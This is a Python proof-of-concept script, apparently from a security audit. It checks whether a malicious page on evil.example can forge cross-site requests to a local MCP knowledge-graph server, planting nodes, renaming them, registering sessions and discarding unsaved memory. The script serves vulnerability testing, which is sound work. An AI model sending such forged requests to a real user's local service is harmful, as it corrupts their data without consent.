"""Which state-changing REST calls can an arbitrary web page trigger?

A page on https://evil.example can send, without any CORS preflight:
GET requests (<img>, fetch no-cors) and POSTs with Content-Type text/plain.
The browser sends Host: 127.0.0.1:8765 (passes host_allowed) and an Origin
header, which only the /ws endpoint checks. The page cannot READ responses,
but side effects happen. This drives the real ASGI routing incl. the Host guard.
"""
import json, os, sys, tempfile
from pathlib import Path
os.environ["KG_STORAGE_ROOT"] = tempfile.mkdtemp()
sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "server"))
import logging; logging.disable(logging.WARNING)
from fastapi.testclient import TestClient
from mcp_http.store import MultiProjectGraphStore, GraphConfig
from mcp_http.session_manager import HTTPSessionManager
from mcp_http.websocket import ConnectionManager
from mcp_http.rest import create_rest_api
from mcp_http.security import host_allowed

sm = HTTPSessionManager()
store = MultiProjectGraphStore(GraphConfig(save_interval=9999), sm, None)
api = create_rest_api(store, sm, ConnectionManager(), "t")
async def guarded(scope, receive, send):          # the Host guard from mcp_streamable_server.app_asgi
    host = dict(scope.get("headers") or []).get(b"host", b"").decode()
    assert host_allowed(host), host
    await api(scope, receive, send)
c = TestClient(guarded, base_url="http://127.0.0.1:8765")
evil = {"origin": "https://evil.example"}
simple_post = {**evil, "content-type": "text/plain"}

r = c.post("/api/nodes", headers=simple_post,
           content=json.dumps({"level": "user", "id": "planted", "gist": "attacker text"}))
print("text/plain POST /api/nodes:", r.status_code, "-> node planted:", "planted" in store.graphs["user"]["nodes"])
r = c.post("/api/nodes/rename", headers=simple_post,
           content=json.dumps({"old_id": "planted", "new_id": "planted-2"}))
print("text/plain POST /api/nodes/rename:", r.status_code)
r = c.post("/api/progress", headers=simple_post,
           content=json.dumps({"task_id": "t", "state": {"x": 1}, "level": "user"}))
print("text/plain POST /api/progress:", r.status_code)
n0 = sm.count()
c.get("/api/session_bootstrap", params={"project_path": os.path.expanduser("~")}, headers=evil)
print("GET /api/session_bootstrap registered a session:", sm.count() > n0)
r = c.get("/api/graph/read", params={"reload": "true"}, headers=evil)
print("GET /api/graph/read?reload=true (discards unsaved memory, F3):", r.status_code)
store.shutdown()

store = MultiProjectGraphStore(GraphConfig(save_interval=9999), sm, None)
api2 = create_rest_api(store, sm, ConnectionManager(), "t")
c2 = TestClient(api2, base_url="http://127.0.0.1:8765")
for path in ("/api/prompt_context", "/api/tool_event"):
    r = c2.post(path, headers=simple_post, content=json.dumps({"cwd": "/x", "prompt": "hi"}))
    print(f"text/plain POST {path}:", r.status_code)
store.shutdown()
